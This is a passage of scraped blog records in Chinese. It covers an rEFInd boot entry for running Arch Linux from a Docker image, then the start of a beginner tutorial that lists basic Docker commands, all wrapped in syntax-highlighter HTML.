class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f37163780007-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f37163780007-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f37163780007-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f37163780007-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f37163780007-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f37163780007-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f37163780007-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1be0f37163780007-1\"><span class=\"crayon-e\">menuentry</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">archlinux</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">docker</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f37163780007-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">icon </span><span class=\"crayon-v\">EFI</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">refind</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">icons</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">os_arch</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">png</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f37163780007-3\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">volume </span><span class=\"crayon-e\">linux</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f37163780007-4\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">loader </span><span class=\"crayon-v\">boot_docker</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">vmlinuz</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">linux</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f37163780007-5\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">initrd </span><span class=\"crayon-v\">boot_docker</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">initramfs</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">linux</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">img</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f37163780007-6\"><span class=\"crayon-e\">        </span><span class=\"crayon-i\">options</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"root=LABEL=linux rootflags=subvol=docker_rwlayer rw docker_path=docker toplayer=LABEL=linux toplayer_path=boot_docker\"</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f37163780007-7\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>其中内核选项中，我们通过<code>root</code>来指定docker目录所在的分区，<code>rootflags</code>中的<code>subvol</code>来指定读写层的位置，<code>docker_path</code>来指定docker目录在<code>root</code>中的相对位置；通过<code>toplayer</code>来指定top layer目录所在的分区，<code>toplayerflags</code>来指定top layer所在分区的挂载选项，<code>toplayer_path</code>来指定top layer的目录在<code>toplayer</code>分区中的相对位置。</p>\n<p>一切就绪，重启并享受吧！</p>\n<p>另外，有兴趣的读者可以看一下笔者自用的docker镜像作为参考：<br>\n<a href=\"https://cloud.docker.com/swarm/zasdfgbnmsystem/repository/docker/zasdfgbnmsystem/archlinux-kde/general\" target=\"_blank\" rel=\"noopener\">https://cloud.docker.com/swarm/zasdfgbnmsystem/repository/docker/zasdfgbnmsystem/archlinux-kde/general</a><br>\n<a href=\"https://github.com/zasdfgbnm-dockers/archlinux-kde\" target=\"_blank\" rel=\"noopener\">https://github.com/zasdfgbnm-dockers/archlinux-kde</a></p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113448\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113448votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113448\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/67490ccebef720732b63d9ddb9e17fb0a590e30a.jpg"}
{"url_object_id": "148acfe5c7841aeb6acee354b96cab45", "title": "为小白准备的重要 Docker 命令说明", "url": "http://blog.jobbole.com/113490/", "create_date": "2018/01/16", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2014/01/382b1251c2cdb32cf334445596f97085.png"], "praise_nums": 2, "comment_nums": 1, "favor_nums": 2, "tags": "IT技术,Docker", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://linuxtechlab.com/important-docker-commands-beginners/\">Shusain </a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9227-1.html\">lujun9972</a>   </div><p>在早先的教程中，我们学过了<a href=\"http://linuxtechlab.com/create-first-docker-container-beginners-guide/\">在 RHEL CentOS 7 上安装 Docker 并创建 docker 容器</a>。 在本教程中，我们会学习管理 docker 容器的其他命令。</p>\n<h3 id=\"toc_1\">Docker 命令语法</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e67370931854\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker [option] [command] [arguments]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e67370931854-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e67370931854-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e67370931854-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">docker</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">option</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">command</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">arguments</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e67370931854-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>要列出 docker 支持的所有命令，运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e72512456774\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e72512456774-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e72512456774-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e72512456774-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">docker</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e72512456774-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>我们会看到如下结果，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e76779350272\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nattach Attach to a running container\r\nbuild  Build an image from a Dockerfile\r\ncommit  Create a new image from a container's changes\r\ncp  Copy files/folders between a container and the local filesystem\r\ncreate  Create a new container\r\ndiff  Inspect changes on a container's filesystem\r\nevents  Get real time events from the server\r\nexec  Run a command in a running container\r\nexport  Export a container's filesystem as a tar archive\r\nhistory  Show the history of an image\r\nimages  List images\r\nimport  Import the contents from a tarball to create a filesystem image\r\ninfo  Display system-wide information\r\ninspect  Return low-level information on a container or image\r\nkill  Kill a running container\r\nload  Load an image from a tar archive or STDIN\r\nlogin  Log in to a Docker registry\r\nlogout  Log out from a Docker registry\r\nlogs  Fetch the logs of a container\r\nnetwork  Manage Docker networks\r\npause  Pause all processes within a container\r\nport  List port mappings or a specific mapping for the CONTAINER\r\nps  List containers\r\npull  Pull an image or a repository from a registry\r\npush  Push an image or a repository to a registry\r\nrename  Rename a container\r\nrestart  Restart a container\r\nrm  Remove one or more containers\r\nrmi  Remove one or more images\r\nrun  Run a command in a new container\r\nsave  Save one or more images to a tar archive\r\nsearch  Search the Docker Hub for images\r\nstart  Start one or more stopped containers\r\nstats  Display a live stream of container(s) resource usage statistics\r\nstop  Stop a running container\r\ntag  Tag an image into a repository\r\ntop  Display the running processes of a container\r\nunpause  Unpause all processes within a container\r\nupdate  Update configuration of one or more containers\r\nversion  Show the Docker version information\r\nvolume  Manage Docker volumes\r\nwait  Block until a container stops, then print its exit code\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e76779350272-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e76779350272-43\">43</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-1\"><span class=\"crayon-e\">attach </span><span class=\"crayon-e\">Attach </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-2\"><span class=\"crayon-e\">build  </span><span class=\"crayon-e\">Build </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Dockerfile</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-3\"><span class=\"crayon-e\">commit  </span><span class=\"crayon-i\">Create</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">image </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">container</span><span class=\"crayon-s\">'s changes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-4\"><span class=\"crayon-s\">cp  Copy files/folders between a container and the local filesystem</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-5\"><span class=\"crayon-s\">create  Create a new container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-6\"><span class=\"crayon-s\">diff  Inspect changes on a container'</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">filesystem</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-7\"><span class=\"crayon-e\">events  </span><span class=\"crayon-e\">Get </span><span class=\"crayon-e\">real </span><span class=\"crayon-e\">time </span><span class=\"crayon-e\">events </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">server</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-8\"><span class=\"crayon-e\">exec  </span><span class=\"crayon-i\">Run</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">command </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-9\"><span class=\"crayon-e\">export  </span><span class=\"crayon-i\">Export</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">container</span>'<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">filesystem </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">archive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-10\"><span class=\"crayon-e\">history  </span><span class=\"crayon-e\">Show </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">history </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-11\"><span class=\"crayon-e\">images  </span><span class=\"crayon-e\">List </span><span class=\"crayon-e\">images</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-12\"><span class=\"crayon-e\">import  </span><span class=\"crayon-e\">Import </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">contents </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tarball </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">create</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">filesystem </span><span class=\"crayon-e\">image</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-13\"><span class=\"crayon-e\">info  </span><span class=\"crayon-e\">Display </span><span class=\"crayon-v\">system</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">wide </span><span class=\"crayon-e\">information</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-14\"><span class=\"crayon-e\">inspect  </span><span class=\"crayon-st\">Return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">low</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">level </span><span class=\"crayon-e\">information </span><span class=\"crayon-i\">on</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">image</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-15\"><span class=\"crayon-e\">kill  </span><span class=\"crayon-i\">Kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-16\"><span class=\"crayon-e\">load  </span><span class=\"crayon-e\">Load </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">archive </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">STDIN</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-17\"><span class=\"crayon-e\">login  </span><span class=\"crayon-e\">Log </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">registry</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-18\"><span class=\"crayon-e\">logout  </span><span class=\"crayon-e\">Log </span><span class=\"crayon-e\">out </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">registry</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-19\"><span class=\"crayon-e\">logs  </span><span class=\"crayon-e\">Fetch </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">logs </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-20\"><span class=\"crayon-e\">network  </span><span class=\"crayon-e\">Manage </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">networks</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-21\"><span class=\"crayon-e\">pause  </span><span class=\"crayon-e\">Pause </span><span class=\"crayon-e\">all </span><span class=\"crayon-e\">processes </span><span class=\"crayon-i\">within</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-22\"><span class=\"crayon-e\">port  </span><span class=\"crayon-e\">List </span><span class=\"crayon-e\">port </span><span class=\"crayon-e\">mappings </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">specific </span><span class=\"crayon-e\">mapping </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">CONTAINER</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-23\"><span class=\"crayon-e\">ps  </span><span class=\"crayon-e\">List </span><span class=\"crayon-e\">containers</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-24\"><span class=\"crayon-e\">pull  </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">an </span><span 